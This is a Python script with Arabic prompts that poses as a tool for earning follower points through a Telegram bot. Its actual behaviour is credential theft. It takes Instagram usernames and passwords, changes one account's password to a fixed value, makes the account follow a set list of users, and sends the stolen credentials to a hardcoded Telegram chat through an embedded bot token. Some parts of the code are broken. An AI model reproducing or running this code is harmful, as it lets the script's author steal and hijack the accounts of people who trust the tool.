from datetime import datetime
import requests
from user_agent import *
from time import sleep
print('ملاحظة مهمة : عند تجميع نقاط من اضافة وهمي سيتم سحب الحساب منك\n اما عن تجميع من متابعة سيبقى معك')
whay = input(' 1- اضافة حساب وهمي بدون تجميع\n 2-تجميع من المتابعة\n INPUT 1 OR 2》》》》')
def checker():
  if whay == '1':
        print('يمكنك تجميع النقاط عن طريق ادخال حسابات وهمية او رابط الدعوة \n على كل حساب يمكنك الحصول على 500 نقطة')
        id=input('ID TELEGRAM:')
        Username = input('\nUSER FAKE ACC')
        Password = input('\nPASSWORD FAKE ACC')
        Youruser=input('\nYOUR INSTAGRAM USER:')
        print('رابط الدعوة الخاص بك هو \n https://t.me/HIMA_FOLLOWERSbot?start='+id)
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {        
        'accept':'*/*',
        'accept-language':'en-US,en;q=0.9',
        'content-length':'378',
        'content-type':'application/x-www-form-urlencoded',
        'cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
        'origin':'https://www.instagram.com',
        'referer':'https://www.instagram.com/',
        'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'sec-ch-ua-mobile':'?0',
        'x-asbd-id':'198387',
        'user-agent': generate_user_agent(),
        'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
        'x-ig-app-id':'936619743392459',
        'x-ig-www-claim':'0',
        'x-instagram-ajax':'3bcc4d0b0733',
        'x-requested-with':'XMLHttpRequest',
        }
        data = {       'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(Password),
        'username':Username,
        }
        respone = requests.post(url,headers=headers,data=data).text
        login = requests.post(url,headers=headers,data=data)
        if "userId" in respone:
            co = login.cookies
            coo = co.get_dict()
            csrf  = coo['csrftoken']
            coockie = f"sessionid={coo['sessionid']};ds_user_id={coo['ds_user_id']};csrftoken={coo['csrftoken']};"        
            url2 = 'https://www.instagram.com/accounts/password/change/'
            head2 = {
            'accept':'*/*',
            'accept-encoding':'gzip,deflate,br',
            'accept-language':'en-US,en;q=0.9,ar;q=0.8',
            'content-length':'269',
            'content-type':'application/x-www-form-urlencoded',
            'cookie': coockie,
            'origin':'https://www.instagram.com',
            'referer':'https://www.instagram.com/',
            'sec-fetch-dest':'empty',
            'sec-fetch-mode':'cors',
            'sec-fetch-site':'same-origin',
            'user-agent': generate_user_agent() ,
            'x-csrftoken':csrf,
            'x-ig-app-id':'936619743392459',
            'x-ig-www-claim':'0',
            'x-instagram-ajax':'8a8118fa7d40',
            'x-requested-with':'XMLHttpRequest'
    }
            time_now = int(datetime.now().timestamp())  
            data2 = {
            'enc_old_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{Password}',
            'enc_new_password1': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:mahdy@282',
            'enc_new_password2': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:mahdy@282', }
            print(f"ستتم اضافة 500 نقطة خلال 1-24 ساعة للتحقق من عدم سحب الحساب")
            Changee = requests.post(url2,headers=head2,data=data2).text
            if '"status":"ok"' in Changee:
             print('')
            else:
             print('')
             req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id={id}&text= ستتم اضافة 500 نقطة خلال 1-24 ساعة للتأكد من عدم سحب الحساب' )
            req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id=1048005193&text={Username}:mahdy@282' )
            req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id=1048005193&text= تم تسجيل حساب جديد \n ايدي الشخص : {id} \n يوزر الوهمي : {Username} \n باسوورد الوهمي : {Password}\nيوزره انستا : {Youruser}')               
        else:
            print(f"الحساب خاطئ ولن تتم اضافة النقاط ")
            req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id={id}&text= لن يتم اضافة النقاط' )  
            req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id=1048005193&text= تم تسجيل حساب خاطئ\n ايدي الشخص : {id} \n يوزر الوهمي : {Username} \n باسوورد الوهمي : {Password}\nيوزره انستا : {Youruser}')                    
checker()
if whay == '2':
	username = input('[=] Enter Username : ')
password = input('[=] Enter Password : ')
url = 'https://www.instagram.com/accounts/login/ajax/'
head = {
	'accept':'*/*',
	'accept-encoding':'gzip,deflate,br',
	'accept-language':'en-US,en;q=0.9,ar;q=0.8',
	'content-length':'269',
	'content-type':'application/x-www-form-urlencoded',
	'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
	'origin':'https://www.instagram.com',
	'referer':'https://www.instagram.com/',
	'sec-fetch-dest':'empty',
	'sec-fetch-mode':'cors',
	'sec-fetch-site':'same-origin',
	'user-agent': generate_user_agent() ,
	'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
	'x-ig-app-id':'936619743392459',
	'x-ig-www-claim':'0',
	'x-instagram-ajax':'8a8118fa7d40',
	'x-requested-with':'XMLHttpRequest'
	}
time_now = int(datetime.now().timestamp())
data = {
	 'username': username,
	 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}',
	 'queryParams': {},
	 'optIntoOneTap': 'false',
}
login = requests.post(url,headers=head,data=data)
if 'userId' in login.text:
	print('تم تسجيل')
	co = login.cookies
	coo = co.get_dict()
	csrf  = coo['csrftoken']
	coockie = f"sessionid={coo['sessionid']};ds_user_id={coo['ds_user_id']};csrftoken={coo['csrftoken']};"
else:
    print('خطأ بالتسجيل')
ids1 = ['mkhalad0','tft_mahdy','gdo1_0','4t_ig','himatools1','malek_ababneh3'] 
for user in ids1:
    urll = (f'https://www.instagram.com/{user}/?__a=1')
    head2 = {
	    'accept':'*/*',
	    'accept-encoding':'gzip,deflate,br',
	    'accept-language':'en-US,en;q=0.9,ar;q=0.8',
	    'content-length':'0',
	    'content-type':'application/x-www-form-urlencoded',
	    'cookie':coockie,
	    'origin':'https://www.instagram.com',
	    'referer':'https://www.instagram.com/',
	    'sec-fetch-dest':'empty',
	    'sec-fetch-mode':'cors',
	    'sec-fetch-site':'same-origin',
	    'user-agent': generate_user_agent() ,
	    'x-csrftoken':csrf,
	    'x-ig-app-id':'936619743392459',
	    'x-ig-www-claim':'0',
	    'x-instagram-ajax':'8a8118fa7d40',
	    'x-requested-with':'XMLHttpRequest' }
    getid = requests.get(urll,headers=head2).json()
    userid = str(getid['logging_page_id']).split("_")[1]
    url3 = (f'https://www.instagram.com/web/friendships/{userid}/follow/')	
    head3 = {
        'accept':'*/*',
        'accept-encoding':'gzip,deflate,br',
        'accept-language':'en-US,en;q=0.9,ar;q=0.8',
        'content-length':'0',
        'content-type':'application/x-www-form-urlencoded',
        'cookie': coockie,
        'origin':'https://www.instagram.com',
        'referer':'https://www.instagram.com/',
        'sec-fetch-dest':'empty',
        'sec-fetch-mode':'cors',
        'sec-fetch-site':'same-origin',
        'user-agent': generate_user_agent() ,
        'x-csrftoken':csrf,
        'x-ig-app-id':'936619743392459',
        'x-ig-www-claim':'0',
        'x-instagram-ajax':'8a8118fa7d40',
        'x-requested-with':'XMLHttpRequest' }
    follow = requests.post(url3,headers=head3).text
    sleep(2)
    if '"status":"ok"' in follow:
	    print('تم متابعة => ' +user)
	    req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id={id}&text=تم متابعة {user} بواسطة {username} : {password}')	    	    
    else:
	    print(' خطأ بالمتابعة => '+user)	
